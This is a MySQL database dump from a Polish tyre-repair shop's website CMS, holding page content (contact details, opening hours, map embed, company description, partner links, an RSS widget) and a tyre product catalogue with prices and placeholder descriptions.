&nbsp;</div>\r\n<div>\r\n	&nbsp;</div>\r\n<div style="text-align: center;">\r\n	<span style="font-size:20px;"><em><strong>Tel: 0-694-273-099 </strong></em></span></div>\r\n<div style="text-align: center;">\r\n	<span style="font-size:20px;"><em><strong>&nbsp;</strong></em></span></div>\r\n<div dir="rtl" style="text-align: center;">\r\n	<span style="font-size:20px;"><em><strong>&nbsp;0-507-417-581 &nbsp; &nbsp; &nbsp;&nbsp;</strong></em></span></div>\r\n<div style="text-align: center;">\r\n	<div>\r\n		&nbsp;</div>\r\n	<div>\r\n		<em><strong><!-- Facebook Like Badge START --></strong></em></div>\r\n	<div>\r\n		<div style="width: 100%;">\r\n			<em><strong>&nbsp;</strong></em></div>\r\n	</div>\r\n</div>\r\n<div style="text-align: center;">\r\n	<h1>\r\n		<span style="font-size:18px;">&nbsp; &nbsp;&nbsp;Email:&nbsp;info@wulkanizacja-szczuczyn.pl</span></h1>\r\n	<p>\r\n		&nbsp;</p>\r\n	<p>\r\n		&nbsp;</p>\r\n</div>\r\n<div style="text-align: center;">\r\n	&nbsp;</div>\r\n<div style="text-align: center;">\r\n	<h2>\r\n		<span style="font-size:18px;"><strong>Godziny Pracy:</strong></span></h2>\r\n	<p>\r\n		&nbsp;</p>\r\n	<h4>\r\n		<span style="font-size:14px;">Od poniedziałku do piątku: 8:00 - 17:00</span></h4>\r\n	<p>\r\n		&nbsp;</p>\r\n	<h4>\r\n		<span style="font-size:14px;">W soboty: 8:00 - 15:00</span></h4>\r\n	<h2>\r\n		&nbsp;</h2>\r\n	<h2>\r\n		&nbsp;</h2>\r\n	<h2>\r\n		<span style="font-size:18px;"><strong>Mapa dojazdu:</strong></span></h2>\r\n	<p>\r\n		&nbsp;</p>\r\n	<p>\r\n		&nbsp;</p>\r\n	<p>\r\n		&nbsp;</p>\r\n	<p>\r\n		&nbsp;</p>\r\n</div>\r\n<div style="text-align: center;">\r\n	&nbsp;</div>\r\n<div>\r\n	<p style="text-align: center; ">\r\n		&nbsp;</p>\r\n	<p style="text-align: left; ">\r\n		&nbsp;</p>\r\n</div>\r\n<p style="text-align: left;">\r\n	<iframe align="middle" frameborder="0" height="645" marginheight="0" marginwidth="0" scrolling="no" src="http://maps.google.pl/maps?q=Zak%C5%82ad+Wulkanizacyjny+Jaros%C5%82aw+Filipkowski&amp;hl=pl&amp;ie=UTF8&amp;view=map&amp;cid=5517239942547165695&amp;ll=53.56558,22.286032&amp;spn=0.006295,0.006295&amp;t=m&amp;vpsrc=6&amp;iwloc=A&amp;output=embed" width="600"></iframe></p>\r\n', '', '', 0, 0, 0, 'Y', '2013-07-24 10:51:26', '2013-07-24 10:51:26', '', '', '', 'index, follow, all', 'Jul 24 2013 12:51:02', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(55, 0, 0, 0, 0, '', 4, 'Linki', '', '<pre>\r\n&nbsp;</pre>\r\n<p style="text-align: center;">\r\n	&nbsp;</p>\r\n<p style="text-align: center;">\r\n	&nbsp;</p>\r\n<p style="text-align: center;">\r\n	<a href="../" target="_parent"><img alt="" height="70" src="../lib/tiny_mce/plugins/airfilemanager/uploads/Linki/baner%282%29.jpg" width="400" /></a></p>\r\n<p style="text-align: center;">\r\n	<span style="font-size: small;">&nbsp;Hodowla Owczarka Niemieckiego &quot;Z Ujscia Pisy&quot;</span></p>\r\n<p style="text-align: center;">\r\n	&nbsp;</p>\r\n<p style="text-align: center;">\r\n	&nbsp;</p>\r\n<p style="text-align: center;">\r\n	<a href="http://euro-owczarki.ovh.org/" target="_blank"><img alt="" height="57" src="../lib/tiny_mce/plugins/airfilemanager/uploads/Linki/baner-euro.jpg" width="425" /></a></p>\r\n<p style="text-align: center;">\r\n	&nbsp;<span style="font-size: small;"> Hodowla Owczarka Niemieckiego &quot;&euro;uro&quot;</span></p>\r\n<p style="text-align: center;">\r\n	&nbsp;</p>\r\n<p style="text-align: center;">\r\n	&nbsp;</p>\r\n<p>\r\n	<a href="http://www.equus.lh.pl" target="_blank"><img alt="Equus FCI .::. Hodowla psów rasowych - Owczarek Niemiecki " height="70" src="http://www.equus.lh.pl/images_pliki/banner_on.jpg" style="display: block; margin-left: auto; margin-right: auto;" width="468" /></a></p>\r\n<p style="text-align: center;">\r\n	<span style="font-size: small;">&nbsp;Hodowla Owczarka Niemieckiego &quot;Equus&quot;</span></p>\r\n<p style="text-align: center;">\r\n	&nbsp;</p>\r\n<p style="text-align: center;">\r\n	&nbsp;</p>\r\n<p style="text-align: center;">\r\n	<span style="font-size: large;"><a href="http://zdrozdapiaskow.pl">http://zdrozdapiaskow.pl</a></span></p>\r\n<p style="text-align: center;">\r\n	Hodowla owczark&oacute;w niemieckich&nbsp; &quot;z Drozda Piask&oacute;w&quot;</p>\r\n<p style="text-align: center;">\r\n	&nbsp;</p>\r\n<h2 style="text-align: center;">\r\n	<span style="font-family: ''times new roman'', times; font-size: xx-large;"><strong><a href="http://www.sigmalomza.pl/">http://www.sigmalomza.pl/</a>&nbsp;</strong></span></h2>\r\n<h2 style="text-align: center;">\r\n	<span style="font-family: ''book antiqua'', palatino; font-size: medium; color: #ff0000;"><strong>Sprzedaż hurtowa i detaliczna chemii gospodarstwa domowego</strong></span></h2>\r\n<h2 style="text-align: center;">\r\n	<span style="font-family: ''book antiqua'', palatino; font-size: medium; color: #ff0000;"><strong>&quot;Prosto z Niemiec&quot;</strong></span></h2>\r\n', '', '', 0, 0, 0, 'N', '2013-08-22 17:51:16', '2013-08-22 17:51:16', '', '', '', 'index, follow, all', 'Aug 22 2013 19:51:01', 5, 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(3, 5, 0, 0, 0, '', 4, 'łB Śąś & ''a + "ł '' @ #$ ]} > 6%/\\', '', '', '', '', 0, 0, 0, 'Y', '2010-10-18 15:51:39', '2010-10-18 15:51:39', '', '', '', 'index, follow, all', 'Oct 18 2010 17:51:44', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(4, 5, 0, 0, 0, '', 6, 'Ipsum', '', '', '', '', 0, 0, 0, 'Y', '2009-10-29 10:55:49', '2010-08-19 13:16:10', '', '', '', 'index, follow, all', 'Oct 29 2009 11:56:08', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(6, 5, 0, 0, 0, '', 5, 'ipsum', '', '', '', '', 0, 0, 0, 'Y', '0000-00-00 00:00:00', '2010-08-19 13:16:10', '', '', '', '', '', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(8, 5, 0, 0, 0, '', 7, 'Sit', '', '', '', '', 0, 0, 0, 'Y', '0000-00-00 00:00:00', '2010-08-19 13:16:10', '', '', '', '', '', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(9, 13, 0, 0, 0, '', 1, 'dolor2', '', '', '', '', 0, 0, 0, 'Y', '2010-07-30 14:55:02', '2010-07-30 14:55:02', '', '', '', 'index, follow, all', 'Jul 30 2010 16:55:22', 5, 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(11, 5, 0, 0, 0, '', 2, 'dodano', '', '', '', '', 0, 0, 0, 'Y', '0000-00-00 00:00:00', '2011-03-15 13:44:37', '', '', '', '', '', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(12, 7, 0, 0, 0, '', 1, 'poza limitem', '', '', '', '', 0, 0, 0, 'Y', '2010-07-16 12:16:48', '2010-08-13 09:45:10', '', '', '', 'index, follow, all', 'Jul 16 2010 14:17:01', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(15, 5, 0, 0, 0, '', 0, 'witka', '', '<p><embed type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" src="files/fck/Flash/flvplayer.swf" flashvars="file=../Flv/20090929101201_web.flv&amp;image=files/fck/Image/bmw.jpg" play="true" loop="true" menu="true" allowfullscreen="true"></embed></p>', '', '', 0, 0, 0, 'N', '2010-01-29 14:48:19', '2011-03-15 13:44:37', '', '', '', 'index, follow, all', 'Jan 29 2010 15:46:46', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(20, 19, 0, 0, 0, '', 1, 'qq', '', '', '', '', 0, 0, 0, 'Y', '0000-00-00 00:00:00', '2010-10-13 16:38:17', '', '', '', '', '', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(23, 22, 0, 0, 0, '', 0, 'ghjf', '', '', '', '', 0, 0, 0, 'Y', '0000-00-00 00:00:00', '2011-03-06 14:03:13', '', '', '', '', '', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(24, 23, 0, 0, 0, '', 0, 'jghjgh', '', '<p>&nbsp;jhgjg</p>', '', '', 0, 0, 0, 'Y', '2011-03-06 14:04:07', '2011-03-06 14:04:07', '', '', '', 'index, follow, all', 'Mar 06 2011 13:06:40', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(28, 0, 0, 0, 0, '', 1, 'galeria', '', '', '', '', 0, 0, 0, 'Y', '0000-00-00 00:00:00', '2011-03-07 16:27:21', '', '', '', '', '', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'pl'),
(27, 0, 0, 0, 0, '', 0, 'home', '', '<p>&nbsp;<span class="Apple-style-span" style="font-family: Arial, Helvetica, sans; font-size: 11px; line-height: 14px; color: rgb(0, 0, 0); ">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nunc massa felis, feugiat et posuere vel, iaculis id sapien. </span></p>\r\n<p><span class="Apple-style-span" style="font-family: Arial, Helvetica, sans; font-size: 11px; line-height: 14px; color: rgb(0, 0, 0); ">Vestibulum ante enim, ultricies quis rutrum ut, tempus nec nisi. Pellentesque quis metus dolor, eget congue libero. </span></p>\r\n<p><span class="Apple-style-span" style="font-family: Arial, Helvetica, sans; font-size: 11px; line-height: 14px; color: rgb(0, 0, 0); ">Nunc fringilla faucibus accumsan. Vestibulum varius diam non ante fringilla venenatis. Aliquam tellus erat, imperdiet vel blandit et, pulvinar.</span></p>', '', '', 0, 0, 0, 'Y', '2011-03-07 16:30:54', '2011-03-07 16:30:54', '', '', '', 'index, follow, all', 'Mar 07 2011 15:32:58', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'pl'),
(29, 0, 0, 0, 0, '', 2, 'Nowości', '', '', '', '', 0, 0, 0, 'Y', '2011-03-07 16:43:24', '2011-03-07 16:43:24', '', '', '', 'index, follow, all', 'Mar 07 2011 15:45:31', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'pl'),
(30, 27, 0, 0, 0, '', 0, 'my home', '', '', '', '', 0, 0, 0, 'Y', '0000-00-00 00:00:00', '2011-03-07 16:49:24', '', '', '', '', '', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'pl'),
(35, 33, 0, 0, 0, '', 0, 'ok', '', '', '', '', 0, 0, 0, 'N', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', '', '', '', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'pl'),
(32, 29, 0, 0, 0, '', 0, 'news', '', '', '', '', 0, 0, 0, 'Y', '0000-00-00 00:00:00', '2011-03-07 16:50:15', '', '', '', '', '', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'pl'),
(41, 40, 0, 0, 0, '', 0, 'ghvhjvhj', '', '<p>&nbsp;vjhvjkvjvhkjvhkjvhkjbvjhbkj</p>', '', '', 0, 0, 0, 'Y', '2011-03-19 14:42:45', '2011-03-19 14:42:45', '', '', '', 'index, follow, all', 'Mar 19 2011 13:45:12', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(56, 0, 2, 0, 0, '', 6, 'Ogłoszenia', '', '<p>\r\n	<span style="font-size:14px;">Mam do zaoferowania&nbsp; komplet&nbsp; felg&nbsp; orginalnych używanych&nbsp; do Opla Astry 15 felgi sa w dobrym stanie ,proste sprawdzone na maszynie&nbsp;</span></p>\r\n', '', '', 0, 0, 0, 'Y', '2011-12-15 09:07:41', '2012-05-25 15:09:43', '', '', '', 'index, follow, all', 'Dec 15 2011 10:06:12', 5, 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(60, 0, 0, 0, 0, '', 1, 'O Nas', '', '<p>\r\n	&nbsp;</p>\r\n<h1>\r\n	<span style="font-size:16px;">&nbsp; &nbsp; &nbsp; &nbsp; Kilka sł&oacute;w o naszej Firmie</span></h1>\r\n<h1>\r\n	<span style="color:#0000cd;">&nbsp; <span style="font-size:16px;">Witamy na stronie internetowej naszego zakładu wulkanizacyjnego!</span></span></h1>\r\n<p style="margin-left: 40px; ">\r\n	&nbsp;</p>\r\n<p style="margin-left: 40px; ">\r\n	&nbsp;</p>\r\n<p style="margin-left: 40px; ">\r\n	&nbsp;</p>\r\n<ul>\r\n	<li>\r\n		&nbsp; &nbsp; &nbsp;Nasza firma od ponad 8 lat świadczy usługi z zakresu wulkanizacji opon oraz sprzedaży</li>\r\n	<li>\r\n		&nbsp; opon i innych towar&oacute;w. &nbsp;Dobra lokalizacja sprawia, że dojazd do naszej firmy nie sprawi</li>\r\n	<li>\r\n		&nbsp; Państwu &nbsp;kłopotu.</li>\r\n</ul>\r\n<p>\r\n	&nbsp;</p>\r\n<ul>\r\n	<li>\r\n		&nbsp; &nbsp; &nbsp;Cały czas staramy się poszerzać zakres proponowanych przez nas usług. sprzedaż</li>\r\n	<li>\r\n		&nbsp; opon &nbsp;i ich wulkanizacja to najczęściej wybierane przez naszych Klient&oacute;w usługi.</li>\r\n	<li>\r\n		&nbsp; Stawiamy na jakość i profesjonalizm, co doceniło już szerokie grono Klient&oacute;w. Dzięki</li>\r\n	<li>\r\n		&nbsp; niskim, uczciwym cenom oferowanych przez nas towar&oacute;w&nbsp; oraz fachowej, wysokiej</li>\r\n	<li>\r\n		&nbsp; jakości obsłudze zyskaliśmy rzeszę stałych Klient&oacute;w, ale r&oacute;wnież aktywnie zjednujemy</li>\r\n	<li>\r\n		&nbsp; sobie nowych, kt&oacute;rzy doceniają standard świadczonych przez nas usług.</li>\r\n	<li>\r\n		&nbsp;</li>\r\n	<li>\r\n		&nbsp; &nbsp; &nbsp;Najważniejszym celem, kt&oacute;ry cały czas staramy się realizować jest poszerzanie</li>\r\n	<li>\r\n		&nbsp; naszej oferty o nowe produkty.</li>\r\n</ul>\r\n<p>\r\n	&nbsp;</p>\r\n<ul>\r\n	<li>\r\n		&nbsp; &nbsp; &nbsp; U nas znajdziecie Państwo wyb&oacute;r opon&nbsp; doskonałej jakości&nbsp; opon, nowych,</li>\r\n	<li>\r\n		&nbsp; bieżnikowanych i używanych, zimowych i letnich znanych producent&oacute;w takich jak</li>\r\n	<li>\r\n		&nbsp; Dębica, Kelly, Sava, Riken, Kleber, Petlas, Oska. Poza oponami w naszej ofercie &nbsp;</li>\r\n	<li>\r\n		&nbsp; posiadamy r&oacute;wnież akumulatory, felgi, kołpaki i dętki.&nbsp; Na zam&oacute;wienie możecie</li>\r\n	<li>\r\n		&nbsp; państwo dostać r&oacute;wnież dowolne cześci do samochod&oacute;w.</li>\r\n</ul>\r\n<p>\r\n	&nbsp;</p>\r\n<ul>\r\n	<li>\r\n		&nbsp; &nbsp; &nbsp;Od początku istnienia firmy dbamy o naszych Klient&oacute;w. Staramy się dostosować do</li>\r\n	<li>\r\n		&nbsp; ich indywidualnych potrzeb i wszelkiego rodzaju zam&oacute;wień. Serdecznie dziękujemy za</li>\r\n	<li>\r\n		&nbsp; zaufanie, kt&oacute;rym obdarzacie nas już tyle lat oraz korzystanie z naszych usług. Uprzejmie</li>\r\n	<li>\r\n		&nbsp; zapraszamy r&oacute;wnież nowych Klient&oacute;w do naszego zakładu wulkanizacyjnego.</li>\r\n</ul>\r\n<p>\r\n	&nbsp;</p>\r\n<ul>\r\n	<li>\r\n		&nbsp; &nbsp; &nbsp;Nasz cel to świadczenie usług na najwyższym poziomie, profesjonalizm, niskie ceny</li>\r\n	<li>\r\n		&nbsp; oraz zadowolenie Klient&oacute;w.</li>\r\n</ul>\r\n<p>\r\n	&nbsp;</p>\r\n<ul>\r\n	<li>\r\n		&nbsp; &nbsp; &nbsp;To Państwo zapewniacie nam istnienie. Jesteście dla nas bardzo ważni, dlatego</li>\r\n	<li>\r\n		&nbsp; pragniemy, aby byli Państwo zadowoleni, w związku z czym każdy z Państwa spotka się</li>\r\n	<li>\r\n		&nbsp; u nas z miłym i profesjonalnym przyjęciem..</li>\r\n</ul>\r\n<p>\r\n	&nbsp;</p>\r\n<p>\r\n	&nbsp;</p>\r\n<ul>\r\n	<li>\r\n		&nbsp; &nbsp; Zapraszam do korzystania z naszych usług!</li>\r\n</ul>\r\n<p>\r\n	&nbsp;</p>\r\n<p>\r\n	<a href="http://www.zujsciapisy.pl" style="text-decoration: none"><span style="color:#ffffff;">owczarek niemiecki</span></a></p>\r\n<p>\r\n	&nbsp;</p>\r\n', '', '', 0, 0, 0, 'Y', '2013-02-25 10:19:16', '2013-02-25 10:19:16', '', '', '', 'index, follow, all', 'Feb 25 2013 11:18:58', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(61, 0, 0, 0, 0, '', 5, 'Aktualności', '', '<script src="/js/rss.js" type="text/javascript"></script><script type="text/javascript">\r\n		$(document).ready(function () {\r\n			 $(''#tab1'').rssfeed(''http://grajewo24.pl/rss.xml'', {\r\n		\r\n		        limit: 10,\r\n		        header:true,\r\n		        date:true,\r\n		        content:true\r\n\r\n		\r\n		    });\r\n                   $(''#tab2'').rssfeed(''http://www.e-grajewo.pl/rss.xml'', {\r\n		\r\n		        limit: 10,\r\n		        header:true,\r\n		        date:true,\r\n		        content:true\r\n\r\n		\r\n		    });\r\n		    \r\n		   \r\n		    \r\n\r\n		});\r\n		</script>\r\n<div id="tab1">\r\n	&nbsp;</div>\r\n<div id="tab2">\r\n	&nbsp;</div>\r\n', '', '', 0, 0, 0, 'Y', '2012-05-25 15:08:33', '2012-05-25 15:09:43', '', '', '', 'index, follow, all', 'May 25 2012 16:54:46', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `page_files`
--

CREATE TABLE IF NOT EXISTS `page_files` (
  `id_page_files` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `id_page` int(10) unsigned NOT NULL,
  `id_file` int(10) unsigned NOT NULL,
  `position` smallint(5) NOT NULL,
  PRIMARY KEY (`id_page_files`),
  UNIQUE KEY `id_page` (`id_page`,`id_file`),
  KEY `position` (`position`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=8 ;

--
-- Zrzut danych tabeli `page_files`
--

INSERT INTO `page_files` (`id_page_files`, `id_page`, `id_file`, `position`) VALUES
(1, 6, 65, 0),
(6, 2, 62, 1),
(5, 2, 63, 0);

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `page_gallery`
--

CREATE TABLE IF NOT EXISTS `page_gallery` (
  `id_page_gallery` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `id_page` int(11) unsigned NOT NULL,
  `id_gallery` int(11) unsigned NOT NULL,
  `position` smallint(5) unsigned NOT NULL,
  PRIMARY KEY (`id_page_gallery`),
  UNIQUE KEY `id_page` (`id_page`,`id_gallery`),
  KEY `position` (`position`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=118 ;

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `photo`
--

CREATE TABLE IF NOT EXISTS `photo` (
  `id_photo` int(11) NOT NULL AUTO_INCREMENT,
  `id_gallery` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `file_name` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `path` varchar(255) NOT NULL,
  `size` int(10) unsigned NOT NULL,
  `width` int(10) unsigned NOT NULL,
  `height` int(10) unsigned NOT NULL,
  `position` int(10) unsigned NOT NULL,
  `added` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP,
  `deleted` enum('Y','N') NOT NULL DEFAULT 'N',
  `active` enum('Y','N') NOT NULL DEFAULT 'N',
  PRIMARY KEY (`id_photo`),
  KEY `id_gallery` (`id_gallery`),
  KEY `deleted` (`deleted`,`active`),
  KEY `position` (`position`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `service`
--

CREATE TABLE IF NOT EXISTS `service` (
  `id_service` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `id_catalog` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `short_content` text NOT NULL,
  `content` text NOT NULL,
  `price` float(10,2) NOT NULL,
  `picture` varchar(255) NOT NULL,
  `added` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP,
  `deleted` enum('Y','N') NOT NULL DEFAULT 'N',
  `active` enum('Y','N') NOT NULL DEFAULT 'N',
  `cap` varchar(255) NOT NULL,
  `destination` varchar(255) NOT NULL,
  `producer` varchar(255) NOT NULL,
  `season` int(11) NOT NULL DEFAULT '0',
  `size` varchar(255) NOT NULL,
  `speed_index` varchar(255) NOT NULL,
  `agricultural` int(11) NOT NULL DEFAULT '0',
  `pr` varchar(255) NOT NULL,
  `maxload` varchar(255) NOT NULL,
  `id_category_type` int(11) NOT NULL DEFAULT '1',
  `warranty` varchar(255) NOT NULL,
  `tension` varchar(255) NOT NULL COMMENT 'Napięcie',
  `capacity` varchar(255) NOT NULL COMMENT 'Pojemność',
  `power_starter` varchar(255) NOT NULL COMMENT 'Moc rozruchowa',
  `diameter_wheel` varchar(255) NOT NULL COMMENT 'Średnica',
  `width_wheel` varchar(255) NOT NULL COMMENT 'Szerokość felgi',
  `spacing_screw` varchar(255) NOT NULL COMMENT 'Rozstaw śrub',
  `seating` varchar(255) NOT NULL COMMENT 'Osadzenie',
  PRIMARY KEY (`id_service`),
  KEY `id_catalog` (`id_catalog`),
  KEY `deleted` (`deleted`,`active`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=242 ;

--
-- Zrzut danych tabeli `service`
--

INSERT INTO `service` (`id_service`, `id_catalog`, `name`, `short_content`, `content`, `price`, `picture`, `added`, `modified`, `deleted`, `active`, `cap`, `destination`, `producer`, `season`, `size`, `speed_index`, `agricultural`, `pr`, `maxload`, `id_category_type`, `warranty`, `tension`, `capacity`, `power_starter`, `diameter_wheel`, `width_wheel`, `spacing_screw`, `seating`) VALUES
(1, 43, 'Dębica Navigator 135/80R12 68T', '', '<p>\r\n	Duis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum</p>\r\n<p>\r\n	Duis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum</p>\r\n<p>\r\n	&nbsp;</p>\r\n<p>\r\n	Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.</p>\r\n<p>\r\n	Duis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum</p>\r\n<p>\r\n	Duis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum</p>\r\n', 120.00, '20130222202148_pobrane.jpg', '2010-02-15 14:28:49', '2013-08-29 20:08:17', 'N', 'Y', 'Navigator', 'Osobowe', 'Dębica', 3, '135/80R12', 'T - do 190 km/h', 0, '', '68 - do 315 kg', 1, '', '', '', '', '', '', '', ''),
(2, 43, 'Riken Snowtime 145/70R13 71Q', '<div class="tresc">\r\n	<p>\r\n		&nbsp;</p>\r\n</div>\r\n', '<div class="tresc">\r\n	<p>\r\n		Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.</p>\r\n	<p>\r\n		Duis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum.</p>\r\n	<div class="tresc">\r\n		<p>\r\n			Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.</p>\r\n		<p>\r\n			Duis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum.</p>\r\n		<div class="tresc">\r\n			<p>\r\n				Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.</p>\r\n			<p>\r\n				Duis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum.</p>\r\n		</div>\r\n	</div>\r\n</div>\r\n', 130.00, '20121121122905_riken_snowtime_145_70_r13_71_q.jpg', '2010-02-15 15:11:43', '2013-08-29 20:09:18', 'N', 'Y', 'Snowtime', 'Osobowe', 'Riken ', 2, '145/70 R13', 'Q - do 160 km/h', 0, '', '71 -	do 345 kg', 1, '', '', '', '', '', '', '', ''),
(5, 43, 'sdasasd', '<p>\r\n	asdas</p>\r\n', '', 0.00, '', '2011-12-27 19:44:16', '2011-12-27 19:45:28', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(6, 43, 'Dębica Frigo Directional 155/70R13 75T', '', '', 140.00, '20120913162221_frigo_directional.jpg', '2011-12-27 19:45:51', '2013-08-29 20:09:31', 'N', 'Y', 'Frigo Directional', 'Osobowe', 'Dębica', 2, '155/70 R13', 'T - do 190 km/h', 0, '12', '75 - do 385 kg', 1, '', '', '', '', '', '', '', ''),
(7, 43, 'Dębica Frigo Directional 165/70R13 75T', '', '', 155.00, '20120913162317_frigo_directional.jpg', '2011-12-27 19:47:16', '2013-08-29 20:07:46', 'N', 'Y', 'Frigo Directional', 'Osobowe', 'Dębica', 2, '165/70R13', 'T - do 190 km/h', 0, '', '75 - do 385 kg', 1, '', '', '', '', '', '', '', ''),
(3, 43, 'Kelly Winter ST 175/70R13 82T', '', '<div class="tresc">\r\n	<p>\r\n		Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.</p>\r\n	<p>\r\n		Duis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum.</p>\r\n	<div class="tresc">\r\n		<p>\r\n			Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.</p>\r\n		<p>\r\n			Duis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum.</p>\r\n		<div class="tresc">\r\n			<p>\r\n				Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.</p>\r\n			<p>\r\n				Duis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum.</p>\r\n		</div>\r\n	</div>\r\n</div>\r\n', 160.00, '20111230160840_big_kelly_winter_st_1318428558.jpg', '2010-02-15 15:13:35', '2013-08-29 19:36:54', 'N', 'Y', 'Winter ST', 'Osobowe', 'Kelly ', 2, '175/70 R13', 'T - do 190 km/h', 0, '', '82 -	do 475  kg', 1, '', '', '', '', '', '', '', ''),
(16, 43, '185/60 R14', '<p>\r\n	sd</p>\r\n', '', 0.00, '', '2011-12-29 12:35:51', '2011-12-29 12:36:17', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(17, 43, '185/60 R14', '<p>\r\n	asd</p>\r\n', '', 0.00, '', '2011-12-29 12:36:36', '2011-12-29 12:38:44', 'Y', 'Y', 'sdf', '', 'dsf', 2, 'dsf', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(18, 43, '165/65r14', '<p>\r\n	awed</p>\r\n', '<p>\r\n	ad</p>\r\n', 0.00, '', '2011-12-29 12:39:41', '2011-12-29 12:42:35', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(19, 43, '175/65r14', '<p>\r\n	esr</p>\r\n', '<p>\r\n	sdf</p>\r\n', 0.00, '', '2011-12-29 12:40:20', '2011-12-29 12:42:55', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
